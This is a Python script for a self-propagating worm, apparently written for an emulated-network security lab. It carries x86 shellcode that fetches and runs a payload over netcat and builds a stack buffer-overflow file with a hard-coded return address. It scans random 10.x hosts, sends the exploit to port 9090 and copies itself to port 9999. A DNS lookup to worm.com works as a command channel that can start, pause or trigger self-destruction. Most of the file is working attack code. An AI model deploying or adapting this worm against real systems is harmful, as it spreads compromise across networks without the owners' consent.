#!/bin/env python3
import sys, os, socket
import time
import subprocess
from random import randint
import signal
from pathlib import Path

# You can use this shellcode to run any command you want
shellcode = (
    "\xeb\x2c\x59\x31\xc0\x88\x41\x19\x88\x41\x1c\x31\xd2\xb2\xd0\x88"
    "\x04\x11\x8d\x59\x10\x89\x19\x8d\x41\x1a\x89\x41\x04\x8d\x41\x1d"
    "\x89\x41\x08\x31\xc0\x89\x41\x0c\x31\xd2\xb0\x0b\xcd\x80\xe8\xcf"
    "\xff\xff\xff"
    "AAAABBBBCCCCDDDD"
    "/bin/bash*"
    "-c*"
    # You can put your commands in the following three lines.
    # Separating the commands using semicolons.
    # Make sure you don't change the length of each line.
    # The * in the 3rd line will be replaced by a binary zero.
    " echo '(^_^) Shellcode is running (^_^)';                   "
    " nc -lnv 9999 > worm.py && python3 worm.py                  "
    "                                                           *"
    "123456789012345678901234567890123456789012345678901234567890"
    # The last line (above) serves as a ruler, it is not used
).encode("latin-1")


# Create the badfile (the malicious payload)
def createBadfile():
    content = bytearray(0x90 for i in range(500))
    ##################################################################
    # Put the shellcode at the end
    content[500 - len(shellcode) :] = shellcode

    ### Need to change based on the output
    ebp = 0xFFFFD5E8
    buf = 0xFFFFD578
    ########################################

    ret = ebp + 40
    offset = ebp - buf + 4

    content[offset : offset + 4] = (ret).to_bytes(4, byteorder="little")
    ##################################################################

    # Save the binary code to file
    with open("badfile", "wb") as f:
        f.write(content)


# Find the next victim (return an IP address).
# Check to make sure that the target is alive.
def getNextTarget():
    while True:
        a = randint(150, 170 + 1)
        b = randint(71, 118)
        ipaddr = f"10.{a}.0.{b}"

        # Get the output of the ping command, look for "1 received"
        try:
            output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
            result = output.find(b"1 received")
        except subprocess.CalledProcessError as e:
            result = -1

        if result == -1:
            print(f"{ipaddr} is not alive", flush=True)
        else:
            print(f"*** {ipaddr} is alive, launch the attack", flush=True)
            return ipaddr


# Check whether the current host is already infected with the worm
def isInfectedAlready():
    exists = os.path.exists("badfile")
    if exists:
        return True
    else:
        return False


# This is for visualization.
DISPLAY = "bash /map-plugins/submit_event.sh -a {}"


def visualize(on=True):
    if on:
        if os.path.isfile("/map-plugins/submit_event.sh"):
            # Directly submit event to map: flash for 5 seconds, and then highlight
            subprocess.run(
                [
                    f"{DISPLAY.format('flash')} && sleep 5 && {DISPLAY.format('highlight')}"
                ],
                shell=True,
            )
        else:
            # Sends ICMP echo message to a non-existing machine every 2 seconds.
            subprocess.run([f"pkill ping"], shell=True)  # kill the ping process if any
            subprocess.Popen(["ping -q -i1 1.2.3.4"], shell=True)
    else:
        if os.path.isfile("/map-plugins/submit_event.sh"):
            subprocess.run(["sleep 1 && " + DISPLAY.format("restore")], shell=True)
        else:
            subprocess.run([f"pkill ping"], shell=True)  # kill the ping process if any


def getCommand():
    try:
        ip_address = socket.gethostbyname("worm.com")
    except socket.gaierror:
        print("Error: The hostname could not be resolved.")

    ip = ip_address.split(".")
    cmd = int(ip[0])
    if cmd == 0:
        return "run"
    elif cmd == 1:
        return "stop"
    elif cmd == 2:
        return "pause"
    elif cmd == 10:
        return "show"
    elif cmd == 11:
        return "off"
    else:
        return "run"


###############################################################

print("The worm has arrived on this host ^_^", flush=True)

# Exit if the host is already infected
if isInfectedAlready():
    print("The host is already infected; do nothing and exit!", flush=True)
    exit(0)

# Visualize the worm
visualize(on=True)

# Create the badfile
createBadfile()


def kill_processes(pattern: str, retries: int = 5):
    """
    Match processes by their full command line:
    1. Send SIGTERM first.
    2. Wait for the processes to exit.
    3. Send SIGKILL if they are still running.
    4. Confirm that no matching process remains.
    """

    def find_pids():
        result = subprocess.run(
            ["pgrep", "-f", pattern],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
        )

        if result.returncode != 0:
            return []

        current_pid = os.getpid()

        return [int(pid) for pid in result.stdout.split() if int(pid) != current_pid]

    # Try a graceful shutdown first.
    pids = find_pids()

    for pid in pids:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass

    # Wait for the processes to exit on their own.
    for _ in range(retries):
        time.sleep(0.2)

        if not find_pids():
            return True

    # Force termination with SIGKILL if SIGTERM did not work.
    pids = find_pids()

    for pid in pids:
        try:
            os.kill(pid, signal.SIGKILL)
        except ProcessLookupError:
            pass

    # Verify again.
    for _ in range(retries):
        time.sleep(0.2)

        if not find_pids():
            return True

    remaining = find_pids()

    raise RuntimeError(
        f"Failed to kill process: pattern={pattern}, remaining={remaining}"
    )


def remove_file(path: str, retries: int = 5):
    """
    Delete a file and confirm that it no longer exists.
    """

    file = Path(path)

    for i in range(retries):
        try:
            file.unlink(missing_ok=True)
        except PermissionError:
            print(f"Permission denied deleting {file}, retrying...")
        except OSError as e:
            print(f"Failed to delete {file}: {e}")

        # Always verify after deletion.
        if not file.exists():
            return True

        time.sleep(0.2)

    raise RuntimeError(f"Failed to delete file: {file}")


# Launch the attack on other servers
current_status = "run"
while True:
    cmd = getCommand()
    if cmd == "stop":
        current_status = "stop"
        print("Self destruction ...", end="", flush=True)
        try:
            kill_processes(r"nc -lnv 9999")
            kill_processes(r"python3 worm\.py")
            kill_processes(r"\bping\b")
            remove_file("badfile")
            remove_file("worm.py")   
            if os.path.isfile("/map-plugins/submit_event.sh"):
                time.sleep(1)
                subprocess.run(DISPLAY.format("restore"), shell=True, check=True)

            print(" done")

        except Exception as e:
            print(f"\nSelf destruction failed: {e}")

        break
    elif cmd == "pause":
        print("Pausing ...", end="", flush=True)
        current_status = "pause"
        time.sleep(5)
        continue
    elif cmd == "show":
        visualize(on=True)
        if current_status != "run":
            time.sleep(5)
            continue
    elif cmd == "off":
        visualize(on=False)
        if current_status != "run":
            time.sleep(5)
            continue
    elif cmd == "run":
        current_status = "run"
        pass
    else:
        pass

    targetIP = getNextTarget()

    # Send the malicious payload to the target host
    print(f"**********************************", flush=True)
    print(f">>>>> Attacking {targetIP} <<<<<", flush=True)
    print(f"**********************************", flush=True)
    subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)

    # Give the shellcode some time to run on the target host
    time.sleep(2)

    # Send a copy of this program (worm.py) to the target host
    subprocess.run([f"nc -w3 {targetIP} 9999 < worm.py"], shell=True)

    # Sleep for 5 seconds before attacking another host
    time.sleep(5)
